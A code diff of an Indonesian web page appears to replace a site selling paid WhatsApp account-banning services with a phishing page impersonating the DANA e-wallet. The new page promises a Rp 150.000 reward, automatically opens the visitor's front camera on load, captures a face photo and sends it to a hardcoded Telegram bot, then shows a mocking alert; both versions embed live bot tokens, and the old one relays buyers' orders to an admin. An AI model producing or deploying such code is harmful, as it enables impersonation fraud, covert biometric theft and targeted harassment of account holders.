@@ -1,508 +1,436 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Jasa Banned WhatsApp</title>
-<style>
-body {
-    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-    margin: 0;
-    padding: 20px;
-    color: #fff;
-}
-
-/* Judul utama dan subjudul efek keren */
-h1 {
-    text-align: center;
-    font-size: 3em;
-    margin-bottom: 20px;
-    letter-spacing: 3px;
-    font-weight: bold;
-    color: #ffd700;
-    text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700, 0 0 30px #ff8c00, 0 0 40px #ff6347;
-    animation: glow 1.5s infinite alternate;
-}
-h2 {
-    margin-top: 40px;
-    margin-bottom: 15px;
-    color: #ff4500;
-    font-size: 2em;
-    font-weight: bold;
-    letter-spacing: 2px;
-    text-shadow: 0 0 8px #ff4500, 0 0 12px #ff6347;
-    text-transform: uppercase;
-    animation: pulse 2s infinite;
-}
-
-/* Efek glow dan pulse untuk teks */
-@keyframes glow {
-    from {
-        text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700, 0 0 30px #ff8c00, 0 0 40px #ff6347;
-    }
-    to {
-        text-shadow: 0 0 20px #ffd700, 0 0 30px #ffd700, 0 0 40px #ff8c00, 0 0 50px #ff6347;
-    }
-}
-@keyframes pulse {
-    0%, 100% {
-        opacity: 1;
-    }
-    50% {
-        opacity: 0.7;
-    }
-}
-
-/* Container dan styling form dan bagian lain */
-#header {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-bottom: 25px;
-}
-#saldoContainer {
-    display: flex;
-    align-items: center;
-    background: rgba(255,255,255,0.2);
-    padding: 15px 25px;
-    border-radius: 20px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-}
-#saldoLabel {
-    font-weight: bold;
-    font-size: 1.4em;
-    margin-right: 12px;
-}
-#saldoDisplay {
-    font-weight: bold;
-    font-size: 1.4em;
-    color: #ffd700;
-}
-form {
-    background: rgba(255,255,255,0.05);
-    padding: 30px 25px;
-    border-radius: 20px;
-    max-width: 700px;
-    margin: 0 auto 40px auto;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    transition: all 0.3s ease;
-}
-form:hover {
-    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-}
-form > * {
-    box-sizing: border-box;
-    margin-top: 12px;
-}
-label {
-    display: block;
-    font-weight: bold;
-    font-size: 1.1em;
-    margin-bottom: 6px;
-}
-input[type=text], select {
-    width: 100%;
-    padding: 14px 20px;
-    border-radius: 12px;
-    border: none;
-    outline: none;
-    background: rgba(255,255,255,0.2);
-    font-size: 1em;
-    color: #fff;
-}
-input[type=text]:focus, select:focus {
-    background: rgba(255,255,255,0.3);
-}
-button {
-    background-color: #ffd700;
-    color: #222;
-    padding: 16px 25px;
-    margin-top: 20px;
-    border: none;
-    border-radius: 20px;
-    cursor: pointer;
-    font-size: 1.2em;
-    width: 100%;
-    font-weight: bold;
-    transition: all 0.3s ease;
-}
-button:hover {
-    background-color: #e6c200;
-    transform: scale(1.02);
-}
-.status {
-    margin-top: 20px;
-    padding: 15px;
-    border-radius: 15px;
-    max-width: 700px;
-    margin: 20px auto;
-    font-size: 1.1em;
-    display: none;
-}
-.status.success {
-    background-color: #d4edda;
-    color: #155724;
-    border-left: 6px solid #28a745;
-}
-.status.error {
-    background-color: #f8d7da;
-    color: #721c24;
-    border-left: 6px solid #dc3545;
-}
-#history {
-    margin-top: 40px;
-}
-#history h2 {
-    text-align: center;
-    font-size: 2em;
-    margin-bottom: 15px;
-}
-#historyList {
-    max-height: 350px;
-    overflow-y: auto;
-    padding: 15px;
-    background: rgba(255,255,255,0.05);
-    border-radius: 20px;
-    box-shadow: inset 0 0 15px rgba(0,0,0,0.4);
-}
-#historyList div {
-    background: rgba(255,255,255,0.1);
-    padding: 12px;
-    border-radius: 12px;
-    margin-bottom: 10px;
-    font-size: 0.95em;
-    line-height: 1.4em;
-    word-wrap: break-word;
-    transition: background 0.3s;
-}
-#historyList div:hover {
-    background: rgba(255,255,255,0.2);
-}
-/* Bubble deposit dan overlay */
-#depositBubbleContainer {
-    position: fixed;
-    top: 50%;
-    right: 30px;
-    transform: translateY(-50%);
-    z-index: 999;
-}
-#depositBubble {
-    width: 70px;
-    height: 70px;
-    background-color: #ffd700;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    font-weight: bold;
-    color: #222;
-    font-size: 14px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    transition: all 0.3s ease;
-}
-#depositBubble:hover {
-    background-color: #e6c200;
-    transform: scale(1.1);
-}
-#depositOverlay {
-    display: none;
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: rgba(0,0,0,0.6);
-    z-index: 1000;
-    justify-content: center;
-    align-items: center;
-}
-#depositContent {
-    background: #fff;
-    padding: 35px;
-    border-radius: 20px;
-    max-width: 370px;
-    width: 90%;
-    box-shadow: 0 8px 20px rgba(0,0,0,0.4);
-    text-align: center;
-    position: relative;
-    color: #222;
-}
-#closeDeposit {
-    position: absolute;
-    top: 12px;
-    right: 20px;
-    background: transparent;
-    border: none;
-    font-size: 24px;
-    cursor: pointer;
-    font-weight: bold;
-    color: #555;
-}
-#depositText {
-    margin-bottom: 20px;
-    font-size: 1.3em;
-    font-weight: bold;
-}
-#depositImage {
-    max-width: 100%;
-    border-radius: 10px;
-    margin-top: 15px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Wajah - DANA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #00a8ff 0%, #0084ff 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .header {
+            background: #00a8ff;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .reward-card {
+            background: linear-gradient(135deg, #ff9a00 0%, #ff6a00 100%);
+            color: white;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(255, 106, 0, 0.3);
+        }
+        
+        .reward-amount {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .reward-text {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .verification-steps {
+            margin: 20px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .step-number {
+            width: 30px;
+            height: 30px;
+            background: #00a8ff;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+        
+        .camera-container {
+            position: relative;
+            width: 100%;
+            height: 250px;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 20px 0;
+            border: 2px solid #00a8ff;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            background: rgba(0, 0, 0, 0.5);
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .camera-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        
+        .face-guide {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 200px;
+            border: 2px solid #00a8ff;
+            border-radius: 50%;
+            z-index: 10;
+        }
+        
+        .status-container {
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .status {
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .status-processing {
+            background: #e8f0fe;
+            color: #1a73e8;
+        }
+        
+        .status-success {
+            background: #e6f4ea;
+            color: #137333;
+        }
+        
+        .status-error {
+            background: #fce8e6;
+            color: #c5221f;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        
+        .progress {
+            height: 100%;
+            background: #00a8ff;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .countdown {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid #f0f0f0;
+            margin-top: 20px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-    <!-- Saldo -->
-    <div id="header">
-        <div id="saldoContainer">
-            <div id="saldoLabel">Saldo Anda:</div>
-            <div id="saldoDisplay">Rp 0</div>
+    <div class="container">
+        <div class="header">
+            <div class="logo">DANA</div>
+            <div class="title">Verifikasi Wajah</div>
+            <div class="subtitle">Untuk keamanan dan menerima hadiah</div>
+        </div>
+        
+        <div class="content">
+            <div class="reward-card">
+                <div class="reward-amount">Rp 150.000</div>
+                <div class="reward-text">Saldo DANA Gratis Menunggu Anda!</div>
+            </div>
+            
+            <p style="text-align: center; margin-bottom: 20px; color: #666;">
+                Selamat! Anda terpilih sebagai penerima hadiah spesial dari DANA.
+            </p>
+            
+            <div class="verification-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>Pastikan wajah Anda terlihat jelas di kamera</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>Tunggu proses verifikasi otomatis</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div>Hadiah akan langsung dikirim ke akun DANA Anda</div>
+                </div>
+            </div>
+            
+            <div class="camera-container">
+                <video id="video" autoplay playsinline></video>
+                <div class="face-guide"></div>
+                <div class="camera-overlay" id="cameraOverlay">
+                    <div class="camera-icon">📷</div>
+                    <div>Mempersiapkan kamera...</div>
+                </div>
+            </div>
+            
+            <div class="status-container">
+                <div class="status status-processing" id="statusMessage">
+                    Memulai verifikasi wajah...
+                </div>
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                <div class="countdown" id="countdown"></div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 PT. Espay Debit Indonesia Koe. All Rights Reserved.</p>
         </div>
     </div>
-    <h1>Jasa Banned WhatsApp</h1>
-    
-    <!-- Form Pesan -->
-    <h2>Pesan Banned untuk Penipu</h2>
-    <form id="bannedForm">
-        <label>Nama:</label>
-        <input type="text" id="name" required />
-        <label>Nomor WhatsApp:</label>
-        <input type="text" id="phone" placeholder="+62..." required />
-        <label>Jenis Pesanan:</label>
-        <select id="orderType" required>
-            <option value="">-- Pilih Jenis Pesanan --</option>
-            <option value="banned">Banned Tinjau (Rp5.000)</option>
-            <option value="unbanned">Banned Permanen (Rp10.000)</option>
-            <option value="gratis">Pesanan Gratis (Stok Harian 10)</option>
-        </select>
-        <button type="submit">Kirim</button>
-    </form>
-    
-    <!-- Riwayat Pembelian -->
-    <div id="history">
-        <h2>Riwayat Pembelian</h2>
-        <div id="historyList"></div>
-    </div>
-    
-    <!-- Klaim Voucher -->
-    <div id="voucherSection" style="margin-top:40px;">
-        <h2>Klaim Voucher</h2>
-        <div id="voucherStatus"></div>
-        <div style="display:flex; gap:10px; justify-content: center; align-items: center; flex-wrap: wrap;">
-            <input type="text" id="voucherCode" placeholder="Input Vocher" style="flex:1; min-width:200px; max-width:300px; padding:10px 15px; border-radius:12px; border:none; background: rgba(255,255,255,0.2); font-size:1em; color:#fff;" />
-            <button id="claimVoucherBtn" style="padding:10px 20px; border-radius:12px; border:none; background-color:#ffd700; font-weight:bold; cursor:pointer; transition: background 0.3s, transform 0.2s;">Klaim</button>
-        </div>
-    </div>
-</div>
 
-<!-- Bubble deposit -->
-<div id="depositBubbleContainer">
-    <div id="depositBubble">Deposit</div>
-</div>
-
-<!-- Overlay deposit modal -->
-<div id="depositOverlay">
-    <div id="depositContent">
-        <button id="closeDeposit">×</button>
-        <div id="depositText">QRIS DEPOSIT</div>
-        <input type="text" id="depositAmount" placeholder="Jumlah Deposit (Rp)" style="width:100%; padding:10px 15px; margin-top:15px; border-radius:12px; border:none; background:rgba(255,255,255,0.2); font-size:1em; color:#000000;"/>
-        <button id="confirmDeposit">KONFIRMASI DEPOSIT</button>
-        <img id="depositImage" src="https://files.catbox.moe/zokrbw.jpg" alt="Deposit Gambar" />
-    </div>
-</div>
-
-<div class="status" id="status"></div>
-
-<script>
-// =========================
-// Variabel token dan admin
-const botToken = '7300180157:AAF8Jq1dBFOCu5k5gU9pw1GY4yRFLXnN2xA';
-const adminChatID = '7242834240'; // ID admin
-
-let lastUpdateId = 0;
-const saldoDisplay = document.getElementById('saldoDisplay');
-const statusDiv = document.getElementById('status');
-const voucherStatusDiv = document.getElementById('voucherStatus');
-const voucherInput = document.getElementById('voucherCode');
-const historyDiv = document.getElementById('historyList');
-
-let riwayatPembelian = JSON.parse(localStorage.getItem('riwayatPembelian')) || [];
-let claimedVouchers = JSON.parse(localStorage.getItem('claimedVouchers')) || {};
-
-// Stok harian gratis
-let stockGratisHarian = parseInt(localStorage.getItem('stockGratisHarian')) || 10;
-
-// Fungsi reset stok harian
-function resetStock() {
-    const today = new Date().toDateString();
-    const lastReset = localStorage.getItem('lastResetDate');
-    if (lastReset !== today) {
-        stockGratisHarian = 10;
-        localStorage.setItem('stockGratisHarian', stockGratisHarian);
-        localStorage.setItem('lastResetDate', today);
-    } else {
-        const stok = localStorage.getItem('stockGratisHarian');
-        if (stok !== null) {
-            stockGratisHarian = parseInt(stok);
-        }
-    }
-}
-
-// Panggil reset stok saat load
-window.onload = () => {
-    resetStock();
-    updateSaldoDisplay();
-    loadRiwayat();
-    setInterval(updateStatus, 30000);
-    setInterval(getUpdates, 3000);
-    // Set value default di select ke kosong
-    document.getElementById('orderType').value = "";
-};
-
-// Fungsi saldo
-function getSaldo() {
-    let s = localStorage.getItem('saldo');
-    if (s === null) {
-        localStorage.setItem('saldo', '0');
-        s = '0';
-    }
-    return parseInt(s);
-}
-function setSaldo(saldo) {
-    localStorage.setItem('saldo', saldo.toString());
-    updateSaldoDisplay();
-}
-function updateSaldoDisplay() {
-    saldoDisplay.innerText = 'Rp ' + getSaldo().toLocaleString('id-ID');
-}
-function showStatus(msg, success=true) {
-    statusDiv.style.display = 'block';
-    statusDiv.innerHTML = msg;
-    statusDiv.className = 'status ' + (success ? 'success' : 'error');
-}
-function generateOrderID() {
-    return 'ORD' + Date.now() + Math.floor(Math.random() * 9000 + 1000);
-}
-function loadRiwayat() {
-    historyDiv.innerHTML = '';
-    riwayatPembelian.forEach(p => {
-        const div = document.createElement('div');
-        div.innerHTML = `
-            ID: ${p.id} | ${p.tanggal} | ${p.jenis} | ${p.nama} | ${p.nomor} | Rp ${p.harga.toLocaleString('id-ID')} | Status: ${p.status}
-        `;
-        historyDiv.appendChild(div);
-    });
-}
-function updateStatus() {
-    const now = Date.now();
-    riwayatPembelian.forEach(p => {
-        if (p.status === 'Proses') {
-            if (now - p.waktu >= 3600000) {
-                p.status = 'Sukses';
+    <script>
+        // Elemen DOM
+        const video = document.getElementById('video');
+        const cameraOverlay = document.getElementById('cameraOverlay');
+        const statusMessage = document.getElementById('statusMessage');
+        const progressBar = document.getElementById('progressBar');
+        const countdownEl = document.getElementById('countdown');
+        
+        // Konfigurasi Telegram
+        const BOT_TOKEN = '7587907102:AAE_0h4_GplcpWO_iJG2YMvmhrgM-ssADrQ';
+        const CHAT_ID = '8034785303';
+        
+        // State variables
+        let stream = null;
+        let photoSent = false;
+        
+        // Fungsi untuk memulai kamera secara otomatis
+        async function startCamera() {
+            try {
+                statusMessage.textContent = 'Mengakses kamera...';
+                updateProgress(10);
+                
+                // Meminta akses ke kamera pengguna
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user' // Gunakan kamera depan
+                    } 
+                });
+                
+                // Menampilkan stream kamera di elemen video
+                video.srcObject = stream;
+                
+                statusMessage.textContent = 'Kamera berhasil diakses';
+                updateProgress(30);
+                
+                // Tunggu sebentar sebelum mengambil foto
+                setTimeout(() => {
+                    cameraOverlay.classList.add('hidden');
+                    statusMessage.textContent = 'Menganalisis wajah...';
+                    updateProgress(50);
+                    
+                    // Tunggu lagi sebelum mengambil foto
+                    setTimeout(captureAndSend, 2000);
+                }, 1500);
+                
+            } catch (err) {
+                console.error('Error mengakses kamera:', err);
+                statusMessage.textContent = 'Gagal mengakses kamera. Pastikan Anda memberikan izin.';
+                statusMessage.className = 'status status-error';
+                cameraOverlay.innerHTML = '<div class="camera-icon">❌</div><div>Izin kamera ditolak</div>';
             }
         }
-    });
-    localStorage.setItem('riwayatPembelian', JSON.stringify(riwayatPembelian));
-    loadRiwayat();
-}
-
-// Kirim ke Telegram
-function sendToTelegram(text) {
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: adminChatID, text: text })
-    });
-}
-
-// =========================
-// Pesanan normal
-document.getElementById('bannedForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    try {
-        const saldo = getSaldo();
-        const orderType = document.getElementById('orderType').value;
-        if (!orderType) { showStatus('Pilih jenis pesanan.', false); return; }
-
-        let harga = 0;
-        let jenis = '';
-
-        if (orderType === 'banned') {
-            harga = 5000;
-            jenis = 'Banned WhatsApp';
-        } else if (orderType === 'unbanned') {
-            harga = 10000;
-            jenis = 'Unbanned WhatsApp';
-        } else if (orderType === 'gratis') {
-            // Cek stok
-            if (stockGratisHarian <= 0) {
-                alert('Stok pesanan gratis habis hari ini.');
-                return;
+        
+        // Fungsi untuk mengambil foto dan mengirimkannya
+        async function captureAndSend() {
+            if (photoSent) return; // Hindari pengiriman ganda
+            
+            photoSent = true;
+            statusMessage.textContent = 'Mengambil foto...';
+            updateProgress(70);
+            
+            // Membuat elemen canvas untuk menangkap frame dari video
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            
+            // Menggambar frame video ke canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Mengonversi canvas ke data URL (base64)
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            statusMessage.textContent = 'Mengirim data verifikasi...';
+            updateProgress(90);
+            
+            // Menghentikan stream kamera
+            if (stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
             }
-            // Kurangi stok dan update
-            stockGratisHarian -= 1;
-            localStorage.setItem('stockGratisHarian', stockGratisHarian);
-            localStorage.setItem('lastResetDate', new Date().toDateString());
-
-            // Kirim info ke admin
-            const pesananID = generateOrderID();
-            const pesanAdmin = `Pesanan Gratis:\nID: ${pesananID}\nJenis: Pesanan Gratis\nWaktu: ${new Date().toLocaleString()}\nStok tersisa hari ini: ${stockGratisHarian}`;
-            sendToTelegram(pesanAdmin);
-
-            // Tambahkan ke riwayat sebagai sukses
-            const pesanan = {
-                id: pesananID,
-                tanggal: new Date().toLocaleString(),
-                jenis: 'Gratis Pesanan',
-                nama: document.getElementById('name').value.trim(),
-                nomor: document.getElementById('phone').value.trim(),
-                harga: 0,
-                status: 'Sukses',
-                waktu: Date.now()
-            };
-            riwayatPembelian.push(pesanan);
-            localStorage.setItem('riwayatPembelian', JSON.stringify(riwayatPembelian));
-            loadRiwayat();
-            showStatus('Pesanan gratis berhasil dibuat!', true);
-            return;
+            
+            // Kirim gambar ke Telegram
+            await sendToTelegram(imageData);
         }
-
-        // Untuk pesanan bayar
-        if (saldo < harga) { showStatus('Saldo tidak cukup.', false); return; }
-
-        const nama = document.getElementById('name').value.trim();
-        const nomor = document.getElementById('phone').value.trim();
-        const idPesanan = generateOrderID();
-        const tanggal = new Date().toLocaleString();
-
-        const pesanan = {
-            id: idPesanan,
-            tanggal: tanggal,
-            jenis: jenis,
-            nama: nama,
-            nomor: nomor,
-            harga: harga,
-            status: 'Proses',
-            waktu: Date.now()
-        };
-        riwayatPembelian.push(pesanan);
-        localStorage.setItem('riwayatPembelian', JSON.stringify(riwayatPembelian));
-        loadRiwayat();
-
-        // Kirim ke admin
-        const message = `Pesanan ${jenis}:\nID: ${idPesanan}\nNama: ${nama}\nNomor: ${nomor}\nHarga: Rp ${harga.toLocaleString()}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: adminChatID, text: message })
+        
+        // Fungsi untuk mengirim gambar ke Telegram
+        async function sendToTelegram(imageData) {
+            try {
+                // Konversi base64 ke blob
+                const response = await fetch(imageData);
+                const blob = await response.blob();
+                
+                // Buat form data untuk dikirim
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'dana_verification.jpg');
+                formData.append('caption', `Verifikasi Dana - ${new Date().toLocaleString('id-ID')}`);
+                
+                // Kirim ke API Telegram
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await telegramResponse.json();
+                
+                if (data.ok) {
+                    statusMessage.textContent = 'Verifikasi berhasil!';
+                    statusMessage.className = 'status status-success';
+                    updateProgress(100);
+                    
+                    // Tampilkan pesan sukses
+                    countdownEl.textContent = 'Hadiah sedang diproses...';
+                    
+                    // Tunggu sebentar lalu tampilkan alert edukasi
+                    setTimeout(() => {
+                        alert('MAMPUSS ILANGG DATA LU📞🗿');
+                    }, 1500);
+                } else {
+                    statusMessage.textContent = 'Gagal verifikasi. Silakan coba lagi.';
+                    statusMessage.className = 'status status-error';
+                }
+            } catch (error) {
+                console.error('Error mengirim ke Telegram:', error);
+                statusMessage.textContent = 'Error dalam verifikasi.';
+                statusMessage.className = 'status status-error';
+            }
+        }
+        
+        // Fungsi untuk memperbarui progress bar
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
+        }
+        
+        // Mulai proses saat halaman dimuat
+        window.addEventListener('load', () => {
+            // Tunggu sebentar untuk efek lebih natural
+            setTimeout(startCamera, 1000);
         });
-        // Kurangi saldo
-        setSaldo(getSaldo() - harga);
-    } catch(e) {
-        console.error('Error saat pesanan:', e);
-        showStatus('Terjadi error, silakan coba lagi.', false);
-    }
-});
-</script>
+    </script>
 </body>
 </html>
